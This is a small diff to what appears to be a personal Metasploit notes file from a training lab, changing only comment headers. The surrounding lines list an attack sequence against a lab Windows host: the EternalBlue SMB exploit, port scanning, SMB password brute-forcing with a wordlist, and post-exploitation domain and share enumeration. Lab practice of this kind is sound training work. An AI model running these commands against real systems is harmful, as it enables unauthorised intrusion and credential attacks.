@@ -2,7 +2,7 @@
 
 use exploit/windows/smb/ms17_010_eternalblue
 
-# set
+## set
 
 setg rhosts 10.10.148.128
 use auxiliary/scanner/portscan/tcp
@@ -29,7 +29,7 @@ setg SMBUser testuser
 setg PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
 run
 
-# enum domain name
+## enum domain name
 
 Use post/windows/gather/enum_domain
 show options
@@ -38,7 +38,7 @@ session -i
 session -i 1
 run
 
-# search enum
+## search enum
 
 search enu_share
 use 0
